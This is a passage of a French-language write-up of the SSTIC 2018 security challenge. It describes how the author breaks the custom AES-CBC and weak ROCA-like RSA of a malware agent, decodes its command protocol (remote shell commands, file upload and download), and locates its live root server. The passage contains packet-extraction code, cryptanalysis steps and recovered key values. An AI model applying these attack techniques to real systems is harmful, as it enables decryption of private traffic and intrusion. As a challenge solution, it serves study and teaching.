Dans le programme, cela est dû au fait que la fonction ``scomm_nextiv``, appelée par ``scomm_send`` pour calculer le prochain vecteur d'initialisation utilisé, ne fait qu'incrémenter ce vecteur.

De plus, en analysant la manière dont les messages qui sont chiffrés sont construits dans la fonction ``message_init``, les 8 premiers octets correspondent à une constante (``41 41 41 41 DE C0 D3 D1`` en hexadécimal) et les 8 suivants à un identifiant défini par l'option ``-i`` du programme (qui est ``babar007`` par défaut).
Ainsi les 16 premiers octets des messages d'une communication sont constants, et le premier bloc chiffré en AES-CBC ne varie donc qu'en fonction du vecteur d'initialisation. Comme le vecteur d'initialisation des 256 premiers messages d'un sens de communication ne varie que de un octet (qui itère de 0 à 255), l'attaque intégrale est possible !

Pour mener correctement l'attaque, il faut d'abord commencer à extraire les blocs chiffrés qui seront utilisés, ce que je fais à l'aide d'un script Python utilisant ``scapy``.
Comme certains paquets TCP sont retransmis dans la trace réseau (et y sont donc présents plusieurs fois), il faut ignorer ces retransmissions dans l'analyse.
Cela peut être réalisé avec la commande ``tshark``[#]_:

.. [#] https://www.wireshark.org/docs/man-pages/tshark.html

.. code-block:: sh

    tshark -r challenge_SSTIC_2018.pcapng.gz -w agent.pcap \
        "ip.addr == 192.168.23.213 and tcp.port == 31337 and !tcp.analysis.retransmission"

Le script Python suivant permet d'extraire les blocs chiffrés utilisés du fichier ``agent.pcap`` produit:

.. code-block:: python

    #!/usr/bin/env python3
    import binascii, json, struct
    from scapy.all import rdpcap, IP, TCP

    # Parcourt les paquets du fichier agent.pcap et extrait le contenu des paquets TCP
    # de chaque sens de la communication agent-serveur
    tcp_contents = {'send': b'', 'recv': b''}
    for pkt in rdpcap('agent.pcap'):
        # Détermine si l'agent envoie ou reçoit des informations
        flow = "%s:%s-%s:%s" % (pkt[IP].src, pkt[TCP].sport, pkt[IP].dst, pkt[TCP].dport)
        if flow == '192.168.231.123:49734-192.168.23.213:31337':
            tcp_contents['send'] += bytes(pkt[TCP].payload)
        elif flow == '192.168.23.213:31337-192.168.231.123:49734':
            tcp_contents['recv'] += bytes(pkt[TCP].payload)
        else:
            raise RuntimeError("Unknown flow %r" % flow)

    # Extrait l'IV et le premier bloc de chaque message
    fistblocks = {direction: [] for direction in tcp_contents.keys()}
    for direction, content in tcp_contents.items():
        # Ignore les 4 premiers paquets de 256 octets
        offset = 512
        while offset < len(content):
            size = struct.unpack('<I', content[offset:offset + 4])[0]
            assert 32 <= size <= 0x4000
            iv = content[offset + 4:offset + 20]
            first_block = content[offset + 20:offset + 36]
            offset += 4 + size

            # Le vecteur d'initialisation est incrémental donc correspond à la
            # position à laquelle est insérée le bloc
            assert struct.unpack('>QQ', iv) == (0, len(fistblocks[direction]))
            fistblocks[direction].append(binascii.hexlify(first_block).decode('ascii'))

    with open('capture_firstblocks.json', 'w') as fp:
        json.dump(fistblocks, fp=fp, indent=2)

Il est possible de mener une attaque intégrale avec les blocs ainsi extraits.
En cherchant une implémentation de cette attaque, j'ai trouvé un script écrit dans le cadre d'un challenge de sécurité informatique[#]_, qui décrit cette attaque et fournit un script Python la réalisant.
En modifiant les variables définissant les blocs chiffrés au début du programme et en exécutant le script, j'obtiens:

.. [#] https://github.com/p4-team/ctf/tree/0440ca11448aaefed95801eafa5646a6d41f021c/2016-03-12-0ctf/peoples_square

.. code-block:: sh

    # Communication du serveur à l'agent
    solved [76, 26, 105, 54, 47, 224, 3, 54, 246, 168, 70, 15, 243, 61, 255, 213]
    # Donc en hexadécimal : 4c1a69362fe00336f6a8460ff33dffd5

    # Communication de l'agent au serveur
    solved [114, 255, 128, 54, 217, 32, 7, 119, 209, 233, 122, 91, 225, 211, 245, 20]
    # Donc en hexadécimal : 72ff8036d9200777d1e97a5be1d3f514

En utilisant ces clés, je peux maintenant déchiffrer le contenu des échanges entre l'agent et le serveur qu'il a contacté.

Un RSA très ROCAilleu
~~~~~~~~~~~~~~~~~~~~~

Même si je dispose maintenant des clés AES ayant servi au chiffrement de la communication étudiée, je m'intéresse également à la manière dont sont générés les bi-clés RSA-2048 par la fonction ``rsa2048_gen``.
La génération d'un bi-clé RSA repose sur la création de deux grands nombres premiers (de l'ordre de :raw-latex:`$2^{1024}$`), généralement nommés :raw-latex:`$p$` et :raw-latex:`$q$`.
La clé publique RSA est constituée d'un exposant public, :raw-latex:`$e$`, qui est ici toujours 65537[#]_, et d'un module, :raw-latex:`$N = p q$`.
La clé privée RSA est constituée d'un exposant privé, :raw-latex:`$d$`, qui est l'inverse modulaire de :raw-latex:`$e$` modulo :raw-latex:`$(p - 1)(q - 1)$`[#]_.

.. [#] https://en.wikipedia.org/wiki/65,537
.. [#] dit autrement, :raw-latex:`$e$` est calculé de sorte que :raw-latex:`$(p - 1)(q - 1)$` divise :raw-latex:`$(d e - 1)$`

Dans ``/tmp/.f4ncyn0un0urs``, la fonction ``rsa2048_gen`` génère deux nombres premiers en utilisant la fonction ``genPrimeInfFast`` puis calcule la clé publique et la clé privée en respectant l'algorithme que je viens de décrire.
Pour générer un nombre premier, ``genPrimeInfFast`` utilise une structure qui est initialisée par la fonction ``init_genPrime``. Cette dernière fonction calcule deux constantes utilisées dans la génération de :raw-latex:`$p$` et :raw-latex:`$q$`:

* un nombre :raw-latex:`$g$` (pour « générateur ») de 492 bits, dont le contenu est présent à l'adresse ``0x4a9200`` (symbole ``gen_p`` de ``/tmp/.f4ncyn0un0urs``, qui fait 62 octets) ;
* un nombre :raw-latex:`$M$` qui est la primorielle[#]_ de 701, c'est à dire le produit de tous les nombres premiers de 2 à 701 inclus.

.. [#] https://fr.wikipedia.org/wiki/Primorielle

``genPrimeInfFast`` génère un grand nombre aléatoire et un petit nombre aléatoire (entre 0 et :raw-latex:`$2^{51}$`), que je note :raw-latex:`$a$` et :raw-latex:`$r$`.
Ensuite la fonction calcule un nombre :raw-latex:`$p$` selon la formule suivante, et recommence la génération des nombres aléatoires si :raw-latex:`$p$` n'est probablement pas premier[#]_:

.. [#] Tester la primalité d'un nombre est un problème mathématique complexe pour lequel il existe des heuristiques raisonnables. La fonction ``genPrimeInfFast`` utilise ``mpz_probab_prime_p(p, 30)`` pour déterminer la primalité de :raw-latex:`$p$`, qui garantit que la probabilité qu'un nombre détecté comme premier ne soit pas premier est inférieure à :raw-latex:`$1/4^{30}$`, selon la documentation, https://gmplib.org/manual/Number-Theoretic-Functions.html.

.. raw:: latex

    \begin{equation*}
        p = (r + 6925650131069390) \times M + (g^a \mbox{ mod } M)
    \end{equation*}

Cet algorithme ressemble étrangement à celui qui était utilisé dans une bibliothèque cryptographie qui a été cassée par la publication « The Return of Coppersmith's Attack: Practical Factorization of Widely Used RSA Moduli »[#]_ (ROCA) en octobre 2017.
Cette bibliothèque utilisait la formule:

.. [#] https://crocs.fi.muni.cz/_media/public/papers/nemec_roca_ccs17_preprint.pdf

.. raw:: latex

    \begin{equation*}
        p = k \times M + (65537^a \mbox{ mod } M)
    \end{equation*}

Le papier de recherche de ROCA définit :raw-latex:`$M$` en fonction de la taille de clé RSA voulue, et utilise le produit des 126 premiers nombres premiers pour une clé RSA-2048, ce qui correspond bien à la primorielle de 701.
Dans ce papier, il est indiqué que factoriser une clé RSA-2048 générée avec l'algorithme décrit prendrait 45,98 ans et coûterait 40305 dollars américains en location de serveur Amazon AWS.
Toutefois, le générateur :raw-latex:`$g$` utilisé dans ``/tmp/.f4ncyn0un0urs`` est différent de celui utilisé dans le papier, 65537.
Avec un peu de chance, cela affaiblit encore plus l'algorithme de génération des nombres premiers et rend possible la factorisation de la clé publique en temps raisonnable.

Le papier évalue la complexité de l'algorithme comme dépendant principalement de « l'ordre » du générateur :raw-latex:`$g$` dans le groupe des inversibles de :raw-latex:`$\mathbbm{Z}/M\mathbbm{Z}$`, qui est le plus petit nombre :raw-latex:`$ord$` tel que:

.. raw:: latex

    \begin{equation*}
        g ^{ord} \mbox{ mod } M = 1
    \end{equation*}

Comme la décomposition de :raw-latex:`$M$` en nombres premiers est directe à obtenir[#]_ et montre qu'il est « friable » (les diviseurs premiers sont petits), le calcul de l'ordre de :raw-latex:`$g$` est rapide:

.. [#] il s'agit du produit de tous les nombres premiers de 2 à 701, ce qui donne la décomposition en nombres premiers

.. raw:: latex

    \begin{equation*}
        ord = 4140287278063689488476992884875650946986538534402358400
    \end{equation*}

Cet ordre semble trop grand pour espérer faire aboutir la factorisation d'une clé RSA-2048 en moins de quelques jours.
Pour réduire la complexité, le papier indique une astuce, dans son paragraphe « 2.3.3 Main idea. »: comme l'algorithme de factorisation est employé sur des nombres qui font :raw-latex:`$\lfloor{\log_2(M)+1}\rfloor = 971$` bits, mais n'a que besoin que de :raw-latex:`$\log_2(N)/4 \approx 512$` bits pour fonctionner, il est possible de remplacer :raw-latex:`$M$` par un nombre plus petit, :raw-latex:`$M'$`, à partir du moment où les conditions suivantes sont respectées:

* :raw-latex:`$M'$` doit être un diviseur de :raw-latex:`$M$`, afin de conserver la forme dans laquelle est décomposé :raw-latex:`$p$` ;
* :raw-latex:`$M'$` doit être supérieur à :raw-latex:`$2^{512}$`, afin que l'algorithme de factorisation employé (l'algorithme de Coppersmith) fonctionne ;
* l'ordre de :raw-latex:`$g$` dans le groupe des inversibles de :raw-latex:`$\mathbbm{Z}/M'\mathbbm{Z}$` doit être petit, car il détermine directement le temps d'exécution que prendra l'algorithme de factorisation.

Le papier indique quelle valeur de :raw-latex:`$M'$` est optimale pour le générateur 65537.
Pour transposer cette attaque pour le :raw-latex:`$g$` qui est utilisé par ``/tmp/.f4ncyn0un0urs``, il est nécessaire de refaire ce travail d'optimisation.
Pour cela, j'ai réutilisé les fonctions de calcul définies dans l'outil de prise d'empreinte de ROCA[#]_, en tentant d'obtenir :raw-latex:`$M'$` en divisant :raw-latex:`$M$` par l'un de ses facteurs premiers et en conservant le résultat si l'ordre de :raw-latex:`$g$` se retrouvait réduit.
Cette méthode a permis de passer d'un :raw-latex:`$M$` de 971 bits à un premier :raw-latex:`$M'$` de 710 bits avec un ordre de :raw-latex:`$g$` de 27663515880.

.. [#] https://github.com/crocs-muni/roca/blob/v1.2.12/roca/detect.py

Une fois cet ordre obtenu, comment factoriser effectivement les deux clés publiques RSA de la communication étudiée ?
Les auteurs du papier ROCA ont utilisé une bibliothèque pour SageMath[#]_, mais ayant par ailleurs trouvé au cours de mes recherches bibliographiques au sujet de ROCA un code SageMath relativement simple[#]_ qui implémente à peu près cette factorisation en utilisant l'implémentation de l'algorithme de Lenstra–Lenstra–Lovász (LLL) fournie par SageMath, je préfère utiliser ce second code en l'adaptant à mes besoins[#]_.

.. [#] https://www.cryptologie.net/article/222/implementation-of-coppersmith-attack-rsa-attack-using-lattice-reductions/
.. [#] https://blog.cr.yp.to/20171105-infineon3.txt
.. [#] en particulier, j'ai modifié les variables ``L`` et ``g`` en les valeurs de :raw-latex:`$M'$` et :raw-latex:`$g$`, ``n`` en celle de la clé publique RSA-2048 que je voulais factoriser, et ai ajouté une boucle ``for`` autour du code de factorisation pour factoriser en supposant connu un :raw-latex:`$p\mbox{ mod }M'$` qui est :raw-latex:`$g^i\mbox{ mod }M'$` avec :raw-latex:`$i$` une valeur de 1 à :raw-latex:`$ord$`

Après quelques minutes d'exécution, je me rends compte que cela prendra quelques jours pour procéder à toutes les tentatives de factorisation. Comme :raw-latex:`$M'$` a encore un peu moins de 200 bits de marge avant d'arriver à 512 bits, il devrait encore être possible de le réduire.
En tentant d'enlever des facteurs de :raw-latex:`$M'$` par paire ou par triplet, quand cela réduisait l'ordre de :raw-latex:`$g$`, je parviens à obtenir un :raw-latex:`$M'$` de 528 bits avec un ordre de :raw-latex:`$g$` de 924.
Ce :raw-latex:`$M'$` permet de factoriser la clé envoyée par l'agent au serveur en quelques secondes, mais pas celle envoyée par le serveur à l'agent.
En augmentant :raw-latex:`$M'$` en ajoutant les derniers facteurs premiers qui lui ont été enlevés, j'obtiens finalement un :raw-latex:`$M'$` de 556 bits avec un ordre de :raw-latex:`$g$` qui vaut 17556:

    :raw-latex:`$M'$` = 1402815059980187190712874383108895102161052570133342324046672808018986916271649262
    33224684617429383600061082975577526560835898499919563153700379304761409264588118078330

En utilisant ce :raw-latex:`$M'$`, la clé RSA envoyée par la machine compromise est factorisée en 2,9 secondes sur mon ordinateur[#]_, et celle envoyée par le serveur en 8,4 secondes.
En reprenant la formule utilisée pour générer un nombre premier à partir de deux nombres aléatoires :raw-latex:`$a$` et :raw-latex:`$r$`, j'obtiens les valeurs suivantes pour les nombres premiers obtenus:

.. [#] mon ordinateur utilise un CPU Intel(R) Core(TM) i7 3.40GHz

* Pour la clé de l'agent de la machine compromise:

    - :raw-latex:`$a = 2085906937225130949391888780182119044711529861348191122$` et :raw-latex:`$r = 296192245055570$`
    - :raw-latex:`$a = 2641761370873495806313775168527176737888173765287656655$` et :raw-latex:`$r = 494593908073432$`

* Pour la clé du serveur avec lequel l'agent a communiqué:

    - :raw-latex:`$a = 3260665468254802334308244523466733604492899823907547187$` et :raw-latex:`$r = 2094104643094744$`
    - :raw-latex:`$a = 3614440005626843566823201796455438124316990425701224160$` et :raw-latex:`$r = 1318068160568412$`

En disposant des nombres :raw-latex:`$p$` et :raw-latex:`$q$` pour chaque bi-clé RSA, je peux reconstruire les exposants privés et déchiffrer les deux messages chiffrés, qui contiennent les clés AES.
Le déchiffrement RSA brut résulte en les deux messages suivants, représentées en hexadécimal:

.. code-block:: xorg

    # agent -> serveur, chiffré avec la clé du serveur
    0000: 0002 5751 c5a3 6b4c e187 405e 857d ef7a
    0010: d9dd 429a 623e 684b 24b2 aed3 0132 28e8
    0020: 3e92 94b3 47f1 ff26 4505 1cd1 a44d 5022
    0030: a539 b52f 67bd 6b89 9f18 f89b 2afc bce2
    0040: da6a 7b57 5a91 69e7 aa2e d113 e1ed 821d
    0050: ae46 e6c5 37a5 7778 db60 34b2 c77e 763f
    0060: 7178 d0e2 2c9e 3212 ce42 4812 8c60 9905
    0070: 21cc ca40 545b 2954 c510 05c1 ef6e 4269
    0080: 60de c2bf dd9c a9fd 273e e9a1 ae8e 57ee
    0090: c1e8 d5ce 93e3 11cf 6a61 eb58 1a9a aca0
    00a0: 7c17 b614 6bdc 2450 afcf 2086 d4e3 5556
    00b0: b8ff 3e4d 5527 909f b704 f9e8 95d8 3742
    00c0: 66e8 1967 dd82 f0d4 92c8 7e4b e3a6 4874
    00d0: 0d4d b90a 35d5 56aa 2408 3f9c 4497 9317
    00e0: dc4c b803 6134 ac48 8779 6ed6 b293 4500
    00f0: 4c1a 6936 2fe0 0336 f6a8 460f f33d ffd5

    # serveur -> agent, chiffré avec la clé de l'agent
    0000: 0002 7a06 2fbf c2d2 7ecc c67d d4d1 7fbc
    0010: 2e97 9f44 8c83 57d5 0a15 421d 64d9 6dd2
    0020: 8ab5 0e75 6fcf ef1e 6d91 6d09 6554 e94f
    0030: 6702 4468 4fd6 279a 49ab 8e60 48bb 7477
    0040: 4908 2f6d bc96 d1f8 c383 98f2 bb48 5f0a
    0050: 4471 40de ad6d ee4a 85a7 2dbc 5d5a ef06
    0060: 17b8 a471 c897 d82d 12a5 2fda f88f f64d
    0070: 3535 817c 3889 487f e8dd caad 8c8f 1161
    0080: 7a36 5956 c20e 2115 f21e da63 26f4 4a53
    0090: b6da 3d4b 072a f55a 0763 64d2 be2b a85f
    00a0: 4bd1 5e01 cdc8 6d51 a4dd f6ef d804 8e5d
    00b0: 9c45 ea1d 2870 91d5 d856 f5dc 6416 29f1
    00c0: 2c78 7910 acf3 6458 54e6 27c0 c42e 27fe
    00d0: 408f c7b3 ea3c d698 97ef 551e 750e 5bea
    00e0: 5c51 d43d 9acc c1fa bbbe 51e0 6a30 4500
    00f0: 72ff 8036 d920 0777 d1e9 7a5b e1d3 f514

Chacun de ces blocs commence par un octet nul et un octet ``02``, suivis par beaucoup d'octets non nuls, et finit par un octet nul suivis de 16 octets.
Il s'agit d'un mécanisme d'encodage des données chiffrées par RSA décrit dans le standard PKCS #1 v1.5[#]_.
Dans chacun des cas, le message qui a été chiffré consiste uniquement en les 16 derniers octets, qui sont les clés AES qui sont utilisées:

.. [#] RFC 2313, https://tools.ietf.org/html/rfc2313

* ``4c1a 6936 2fe0 0336 f6a8 460f f33d ffd5`` est la clé AES avec laquelle le serveur chiffre les données qu'il envoie à la machine compromise, qui les déchiffre ;
* ``72ff 8036 d920 0777 d1e9 7a5b e1d3 f514`` est la clé AES avec laquelle l'agent de la machine compromise chiffre les données envoyées au serveur, qui les déchiffre.

Je retrouve ainsi les même clés que trouvées précédemment en cassant le chiffrement des messages.


Un filet qui est un arbre
~~~~~~~~~~~~~~~~~~~~~~~~~
:raw-latex:`\label{sect:1-protocole}`

En disposant les clés de chiffrement et déchiffrement AES qui ont été utilisées, il est possible de déchiffrer la communication qui a eu lieu entre la machine compromise et le serveur ``192.168.23.213:31337``. Le contenu déchiffré consiste en des messages clairement découpés (par opposition à un flot continu de données, comme ce peut être le cas avec TLS). La structure de ces messages peut être déterminée en analysant la fonction ``mesh_process_message``. Voici une représentation de cette structure sous forme de tableau dans lequel chaque ligne correspond à 16 octets:

.. code-block:: xorg

    |  0   1   2   3   4   5   6   7   8   9   A   B   C   D   E   F  |
    +--------------------------------+--------------------------------+
    | 41  41  41  41  DE  C0  D3  D1 |        nom ("babar007")        |
    +--------------------------------+--------------------------------+
    |        ID agent source         |      ID agent destination      |
    +----------------+---------------+--------------------------------+
    |    commande    |    taille     |          contenu ...           |
    +----------------+---------------+--------------------------------+
    | ... contenu ...                                                 |
    +-----------------------------------------------------------------+

Les 40 premiers octets correspondent à un en-tête qui apporte des informations au sujet du contenu du message.
Les « ID agents » correspondent à des identifiants qui peuvent être générés aléatoirement ou définis par l'option ``-i`` de ``/tmp/.f4ncyn0un0urs``, et permettent de transmettre des messages entre deux agents qui ne sont pas directement connectés.
En effet, quand ``/tmp/.f4ncyn0un0urs`` est lancé en tant qu'agent, il se connecte à un serveur et se place également en écoute sur un autre port TCP, permettant ainsi à un autre agent de se connecter à lui.
Il transmet alors les message que cet autre agent lui envoie et qui ne lui sont pas adressés [#]_.
Ceci permet en pratique de construire un réseau arborescent, dans lequel chaque agent a un *parent* (serveur auquel il se connecte) et des *enfants*, qui sont les agents qui s'y connectent.
La racine de cet arbre [#]_ n'est pas un agent, car il ne communique pas avec un serveur, mais est un serveur qui accepte des connections d'agents.
J'appelle donc *serveur racine* cette racine.

.. [#] ce comportement se remarque par l'appel, dans la fonction ``mesh_process_message``, à la fonction ``scomm_send`` pour transmettre de tels messages
.. [#] la racine de l'arbre est l'ancêtre commun à tous les agents

En revenant à l'analyse de la fonction ``agent_init``, je remarque que lorsque ``/tmp/.f4ncyn0un0urs`` est lancé avec l'option ``-c`` suivie du dernier flag intermédiaire trouvé, il ne se connecte pas à un serveur mais accepte des connexions.
J'imagine donc que le serveur racine consiste simplement en une instance de ``/tmp/.f4ncyn0un0urs`` exécutée comme cela, ce qui se révèlera être le cas plus tard[#]_.

.. [#] il s'agit d'une hypothèse importante, qui s'appuie sur une intuition, car la seule manière de vérifier cela serait de prendre le contrôle de la machine exécutant le serveur racine... ce que j'effectuerai plus tard

L'en-tête du message comporte deux champs qui sont en relation avec le contenu : une *commande* et une *taille*. La *taille* correspond au nombre d'octets du message à utiliser (en-tête et contenu).
En effet, le chiffrement opérant sur des blocs de 16 octets, les messages déchiffrés font une taille qui est un multiple de 16 octets. La présence du champ *taille* dans l'en-tête permet d'implémenter simplement le fait d'ignorer les octets qui ont été chiffrés en plus pour obtenir un multiple de 16 octets.
Je peux ainsi m'attendre à ce qu'un message légitime (du protocole de communication des agents) utilise un champ *taille* de valeur inférieure ou égale à celle du message effectivement chiffré.
Diverses vérifications dans le code de ``/tmp/.f4ncyn0un0urs`` empêchent le champ *taille* de dépasser ``0x4000`` (16 kilo-octets), mais ne le comparent pas toujours à la taille des données effectivement déchiffrées, ce qui peut amener à des vulnérabilités...
Je m'intéresserai à cela plus tard.

En ce qui concerne le champ *commande*, il s'agit d'un nombre entier (de 32 bits petit boutiste) décrivant ce en quoi consiste le contenu: une commande à exécuter, le résultat d'une telle commande, etc.
La lecture de l'implémentation des fonctions ``mesh_process_message``, ``mesh_process_agent_peering``, ``mesh_process_dupl_addr``, ``msg_process_job``, etc. permet de déterminer les commandes reconnues par ``/tmp/.f4ncyn0un0urs`` [#]_:

.. [#] les noms entre parenthèses correspondent à l'interprétation que j'ai faite des commandes, et permettent de m'en référer au lieu d'utiliser des nombres hexadécimaux peu clairs

* Si les trois bits de poids faible du second chiffre hexadécimal sont nuls, il s'agit d'une requête:

    * ``00000100 (PING)``: requête « Ping » (demande de renvoyer le contenu tel quel)
    * ``00000201 (CMD)``: requête d'exécution d'une commande *shell* (avec ``/bin/sh -c contenu``)
    * ``00000202 (PUT)``: requête d'ouverture en écriture du fichier indiqué dans le contenu
    * ``00000204 (GET)``: requête d'ouverture en lecture du fichier indiqué dans le contenu
    * ``00010000 (PEER)``: requête de *peering* entre un agent et son parent (le contenu est vide)
    * ``00020000 (DUP_ID)``: message envoyé du parent à un enfant indiquant que l'ID agent utilisé existe déjà (il est « dupliqué » ; le contenu est vide)

* Sinon, il s'agit d'une réponse à une requête:

    * le bit de poids faible du second chiffre hexadécimal indique une réponse ;
    * le second bit est utilisé pour les réponses qui peuvent s'étendre sur plusieurs messages (par exemple une lecture de fichier) ;
    * le troisième bit est utilisé pour signaler la fin d'une réponse qui s'étend sur plusieurs messages.

Par exemple :

* ``01000100 (PING_REPLY)``: réponse à une commande ``PING``
* ``01010000 (PEER_REPLY)``: réponse à une commande ``PEER``
* ``03000201 (CMD_CONTENT)``: extrait de la sortie de la commande, suite à une commande ``CMD``
* ``03000202 (PUT_CONTENT)``: extrait du contenu du fichier à écrire, suite à une commande ``PUT``
* ``03000204 (GET_CONTENT)``: extrait du contenu du fichier à lire, suite à une commande ``GET``
* ``05000201 (CMD_DONE)``: fin de l'exécution de la commande *shell*, suite à une commande ``CMD``
* ``05000202 (PUT_DONE)``: fin de l'écriture du fichier à écrire, suite à une commande ``PUT``
* ``05000204 (GET_DONE)``: fin de la lecture du fichier à lire, suite à une commande ``GET``

Par ailleurs, même si aucune fonction n'émet de message avec la commande ``xxx4xxxx``, un tel message est reconnu par ``mesh_process_message`` de manière similaire à la commande qu'il y aurait avec ``0`` à la place de ``4``. De manière plus générale, ``mesh_process_message`` est assez laxiste sur les commandes reconnues. Par exemple ``00000101``, ``00000102``, etc. sont aussi considérées comme des commandes ``PING``.

Lorsqu'un agent se connecte à un serveur, le premier message qu'il envoie après avoir établi un canal de communication sécurisé (par l'échange de clés AES) est un message ``PEER`` destiné à l'agent d'identifiant 0, qui est envoyé par la fonction ``mesh_agent_peering``. Cette fonction attend ensuite une réponse du serveur et implémente la logique qui est appliquée en fonction de cette réponse:

* si le serveur répond un message avec une commande ``DUP_ID`` (ce qui traduit un conflit d'ID agent utilisé), le programme regénère un ID agent aléatoire, envoie un autre message ``PEER``, et recommence la logique appliquée à la réception de la réponse du serveur.
* sinon, la fonction enregistre le contenu de la réponse, qui est utilisée par ``agent_main_loop`` pour trouver un autre serveur auquel se connecter si la connexion avec le serveur initial s'interrompt.

La fonction ``mesh_process_agent_peering`` implémente la logique côté serveur de cet échange. Lorsqu'un agent ou le serveur racine reçoit un message ``PEER`` provenant d'un enfant, une vérification est faite pour émettre un message ``DUP_ID`` si l'ID agent utilisé est déjà connu.
Dans le cas où l'ID agent n'était pas connu, il est enregistré dans des structures puis une réponse est envoyée avec comme contenu ce qui est utilisé pour établir de nouveau la connexion vers un serveur en cas d'erreur.
Il s'agit d'un tableau dont chaque élément fait 560 octets, qui référencie donc des serveurs, et qui contient pour chaque serveur une adresse IP et un port, un ID agent, des clés AES, etc.

La logique implémentée dans ``mesh_agent_peering`` et ``mesh_process_agent_peering`` permet alors de comprendre que le message ``PEER`` initial est transmis de parent en parent jusqu'au serveur racine et que la réponse reçue contient une structure de 560 octets pour chaque ancêtre sauf le parent permettant de s'y connecter[#]_.

.. [#] lorsqu'un agent se connecte à un autre agent, qui devient son « parent » dans le réseau, ce parent lui transmet donc les informations du grand-parent, de l'arrière-grand-parent, etc. de l'agent, jusqu'au serveur racine

La racine de l'arbre
~~~~~~~~~~~~~~~~~~~~

Maintenant que j'ai quelques éléments permettant de comprendre la communication effectuée par ``/tmp/.f4ncyn0un0urs``, il est temps de revenir encore une fois à la trace réseau.
En utilisant les clés AES, je réussis à déchiffrer les messages échangés avec ``192.168.23.213:31337`` [#]_.
Le premier message est bien une commande ``PEER``, qui est émise avec l'ID agent source ``0x28e48f9f80ddf725``.
Le serveur y répond avec l'ID agent ``0xdf8e9f2b91cee2d4`` et un contenu qui fait 560 octets.
Ceci signifie d'une part que ``192.168.23.213:31337`` n'est pas le serveur racine mais un agent, et d'autre part que ``192.168.23.213:31337`` est directement connecté au serveur racine [#]_.

.. [#] la reconstitution de l'échange est disponible dans la figure :raw-latex:`\ref{fig:timeline-agent}`, section :raw-latex:`\ref{sect:1-synthese}`
.. [#] le contenu du message est en effet constitué d'un seul bloc de 560 octets

Le contenu de la réponse à la commande ``PEER`` commence par les 16 octets suivants: ``00 00 00 00 00 00 00 00 02 00 8f 7f c3 9a 69 0c``. Les 8 premiers correspondent à l'ID agent du serveur racine, ``0``, et les 8 suivants correspondent à une structure ``sockaddr_in`` [#]_ décrivant les informations de connexion TCP/IP au serveur racine:

.. [#] http://man7.org/linux/man-pages/man7/ip.7.html

* ``sin_family = 2`` correspond à ``AF_INET`` ;
* ``sin_port = 0x8f7f`` correspond au port TCP 36735 ;
* ``sin_addr.s_addr = 0xc39a690c`` correspond à l'adresse IP ``195.154.105.12``.

Donc au moment de l'attaque, le serveur racine écoutait en ``195.154.105.12:36735``.
En essayant rapidement de m'y connecter, je me rends compte que le serveur est encore actif ! Le mandat initial précisait:

    « Votre mission, si vous l'acceptez, consiste donc à identifier le serveur hôte utilisé pour l'attaque et de vous y introduire [...] »

La première partie est réalisée et je peux donc passer à la suite.

Avant cela, je jette un coup d'œil aux messages échangés avec la machine compromise après la réponse à la commande ``PEER``.
Le serveur racine a envoyé quelques commandes *shell* permettant d'énumérer le contenu des dossiers ``/home``, ``/home/user`` et ``/home/user/confidentiel`` avant de créer une archive ``/tmp/confidentiel.tgz`` et de la télécharger par une commande ``GET``.
Ensuite le serveur racine a envoyé une commande ``PUT`` pour créer le fichier ``/tmp/surprise.tgz``.
En concaténant les contenus des commandes ``GET_CONTENT`` et ``PUT_CONTENT``, je parviens à récupérer ``confidentiel.tgz`` et ``surprise.tgz``.
La première archive contient des documents PDF décrivant des outils de la CIA et un flag de validation intermédiaire dans ``home/user/confidentiel/super_secret``:

.. raw:: latex

    \intermediateflag{Battle-tested Encryption}{SSTIC2018\{07aa9feed84a9be785c6edb95688c45a\}}

La seconde contient une collection de 27 photos sur le thème du *Lobster Dog* (cf. figure :raw-latex:`\ref{fig:lobster-dog}`).

.. raw:: latex

    \screenshotwr{.9\textwidth}{lobster-dog}{images/01_wallpapers-pho3nix-albums-wallpaper.jpg}{Image présente dans \texttt{surprise.tgz}}


:raw-latex:`\clearpage`

Synthèse de l'attaque
---------------------
:raw-latex:`\label{sect:1-synthese}`

Les sections précédentes décrivent différents éléments qui permettent de retrouver les communications effectuées entre la machine qui a été attaquée et l'infrastructure de l'attaquant.
Les figures suivantes représentent ces éléments sous la forme de frises chronologiques.
La figure :raw-latex:`\ref{fig:timeline-network}` reprend des connexions TCP/IP présentes dans la trace réseau et la figure :raw-latex:`\ref{fig:timeline-agent}` décrit le contenu de la communication avec ``192.168.23.213:31337``.

.. raw:: latex

    \begin{figure}[htbp]
        \centering
        \input{images/01_timeline_network.tikz.tex}
        \caption{Frise chronologique des connexions effectuées par la machine attaquée}
        \label{fig:timeline-network}
    \end{figure}

    \begin{figure}[htbp]
        \centering
        \input{images/01_timeline_agent.tikz.tex}
        \caption{Chronologie des messages échangés entre l'agent \texttt{/tmp/.f4ncyn0un0urs}, le premier serveur et le serveur racine. Les échanges dessinés en noir sont chiffrés avec les clés AES échangées lors de l'échange de clés, en rouge}
        \label{fig:timeline-agent}
    \end{figure}
